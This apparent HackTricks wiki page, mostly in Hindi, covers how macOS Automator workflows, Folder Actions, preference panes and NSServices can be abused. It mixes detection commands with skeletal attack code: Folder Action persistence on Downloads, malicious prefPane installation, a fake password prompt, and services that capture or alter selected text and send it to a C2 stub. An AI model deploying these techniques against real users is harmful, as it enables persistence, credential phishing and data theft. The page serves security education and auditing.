# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** macOS का visual automation tool है। यह **workflows** (`.workflow` bundles) execute करता है, जो **actions** (`.action` bundles) से बने होते हैं। Automator **Folder Actions**, **Quick Actions**, और **Shortcuts** integration को भी power देता है। modern macOS पर, workflows को **Shortcuts** में भी import किया जा सकता है, इसलिए वही malicious logic Finder Quick Action, `~/Library/Services/` के under एक user service, या legacy Automator actions द्वारा backed shortcut के रूप में दिख सकता है।

Automator actions **plugins** हैं जो workflow execute होने पर Automator runtime में load होते हैं। ये कर सकते हैं:
- Arbitrary shell scripts execute करना
- Files और data process करना
- AppleScript के through applications के साथ interact करना
- Complex automation के लिए chain together करना

### Why This Matters

> [!WARNING]
> Automator workflows को execution के लिए **social-engineered** किया जा सकता है — ये simple document files जैसे दिखते हैं। एक `.workflow` bundle में embedded shell commands हो सकते हैं जो workflow run होने पर execute होते हैं। Folder Actions के साथ मिलकर, ये file events पर trigger होने वाली **automatic persistence** provide करते हैं। Recent Gatekeeper fixes ने भी दिखाया कि **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) को harmless data नहीं, बल्कि executable content के रूप में treat करना चाहिए।

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### हमला: Social-Engineered Workflow

एक `.workflow` bundle ज़्यादातर users को एक normal document file जैसा दिखता है:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: फ़ोल्डर Action Persistence

Folder Actions स्वचालित रूप से एक workflow execute करते हैं जब files एक monitored folder में add की जाती हैं:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions रीबूट के बाद भी बने रहते हैं और चुपचाप execute होते हैं। `~/Downloads` पर एक Folder Action का मतलब है कि **हर डाउनलोड की गई file आपका payload trigger करती है** — जिसमें Safari, Chrome, AirDrop, और email attachments से आई files भी शामिल हैं। यह भी ध्यान दें कि `System Events` ऐसे Folder Actions register कर सकता है जो default `~/Library/Scripts/Folder Action Scripts` locations के बाहर scripts की ओर point करते हैं, जिससे loose-path hunting worthwhile हो जाता है। संबंधित TCC implications के लिए, [the TCC page](../macos-security-protections/macos-tcc/README.md) देखें।

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) ऐसे plugins हैं जो **System Settings** (पहले System Preferences) से load होते हैं। ये system या third-party features के लिए configuration UI panels प्रदान करते हैं। पुराने systems पर ये सीधे `System Preferences` द्वारा loaded होते थे; नए releases पर third-party panes आमतौर पर एक **legacy loader XPC service** द्वारा broker किए जाते हैं, जो System Settings से शुरू होता है।

### Why This Matters

- Preference panes **trusted host process** में execute होते हैं, जो System Settings / System Preferences द्वारा spawned होता है
- आधुनिक systems पर वह host एक **`legacyLoader` XPC service** हो सकता है, इसलिए महत्वपूर्ण boundary फिर भी **trusted Apple UI process -> third-party code loading** ही है
- Third-party preference panes **host process security context** और उस UI से जुड़ा user trust inherit करते हैं
- Users preference panes को **double-clicking** करके install करते हैं — easy social engineering
- Once installed, ये **persist** रहते हैं और हर बार System Settings उस panel को खोलता है तब load होते हैं

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### हमला: Privilege Context Hijacking

एक malicious preference pane **pane host** के security context को inherit करता है (historically `System Preferences`, newer versions में अक्सर `System Settings` द्वारा launched एक `legacyLoader` helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### हमला: इंस्टॉलेशन के माध्यम से persistence
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

एक preference pane वैध system UI panels की नकल कर सकता है ताकि **credentials** के लिए **phish** किया जा सके:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** अनुप्रयोगों को **Services menu** (right-click → Services) के माध्यम से अन्य ऐप्स को functionality प्रदान करने की अनुमति देते हैं। जब कोई उपयोगकर्ता text या data चुनकर किसी service को invoke करता है, तो चयनित data processing के लिए **service provider** को **sent** किया जाता है।

Services को किसी application के `Info.plist` में `NSServices` key के तहत declare किया जाता है और pasteboard server (`pbs`) के साथ register किया जाता है। macOS एक **service cache** और एक **restriction policy** भी रखता है, जो तय करते हैं कि कौन-सी services visible होंगी और क्या sandboxed callers को extra warning मिलेगी।

### Why This Matters

- Services को **cross-application data flow** मिलता है — किसी भी application से selected text service को भेजा जाता है
- एक malicious service password managers, email clients, financial apps से data capture कर सकता है
- Services calling application को **modified data return** कर सकते हैं (selection operations पर man-in-the-middle)
- Service names को legitimate दिखने के लिए craft किया जा सकता है ("Format Text", "Encrypt Selection", "Share")
- Optional `NSRestricted` flag security-relevant है: unrestricted marked service को sandboxed app बिना उस warning के call कर सकती है जो macOS escape-prone services के लिए दिखाता है

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### हमला: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### अटैक: Data Modification (Man-in-the-Middle)

एक service **returned data को modify** कर सकती है, जबकि वह एक legitimate function प्रदान करती हुई दिखती है:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple प्रत्येक service definition के लिए वैकल्पिक `NSRestricted` boolean सपोर्ट करता है। यदि यह set हो, तो macOS sandboxed callers को warn करता है क्योंकि यह service उन्हें **sandbox या privacy boundaries से escape** करने में मदद कर सकती है। Offensive perspective से, यह दो useful audit paths देता है:

- ऐसे **third-party services** ढूँढें जिन्हें restricted marked नहीं किया गया है, जबकि वे Apple Events, file access, या अन्य privileged actions proxy करती हैं
- **high-value built-in services** ढूँढें जिनमें strong entitlements हों (उदाहरण के लिए, Script Editor या Finder-backed helpers द्वारा exposed services) और जाँचें कि क्या user interaction उन्हें data-access primitive में बदलने के लिए पर्याप्त है

एक अच्छा recent example **CVE-2022-48574** है, जहाँ Services mechanism का abuse करके **TCC-protected user files** तक expected confirmation flow के बिना पहुँचा जा सकता था। यह bug fixed है, लेकिन technique threat modeling के लिए अभी भी useful है: कोई भी service जो caller की ओर से file access या automation requests forward करती है, उसे समान scrutiny मिलनी चाहिए।

---

## Recent Security Notes

- **Quick Actions executable content हैं**: Apple ने 2024 में एक Gatekeeper bypass fix किया था, जहाँ app-bundled Automator Quick Action normal assessment के बिना run हो सकती थी। Apps audit करते समय `Contents/PlugIns/*.workflow/Contents/document.wflow` को ठीक उसी तरह inspect करें जैसे आप helper scripts या login items को करते हैं। देखें [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts legacy Automator behavior inherit कर सकते हैं**: Apple ने एक अतिरिक्त user-consent prompt भी add किया था, जब third-party shortcuts को एक **legacy Automator action** का उपयोग करते हुए पाया गया जो expected permission flow के बिना Apple Events भेज रहा था। Imported workflows और shortcut bundles को `Run AppleScript`, `Run Shell Script`, और इसी तरह की bridge actions के लिए review किया जाना चाहिए। देखें [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator अभी भी एक live privacy boundary है**: Apple ने 2025 में protected user data तक access के लिए एक और Automator fix ship किया। भले ही Automator एक legacy surface हो, किसी भी workflow runner, Quick Action host, या automation bridge को dead code नहीं, बल्कि current attack surface की तरह treat करें।

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → पासवर्ड मैनेजर Theft
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## संदर्भ

* [Apple — macOS Ventura 13.7, Sonoma 14.7, और Sequoia 15 की security content के बारे में](https://support.apple.com/en-us/121238)
* [Moonlock — macOS पर NSServices exploit कैसे काम करता था](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
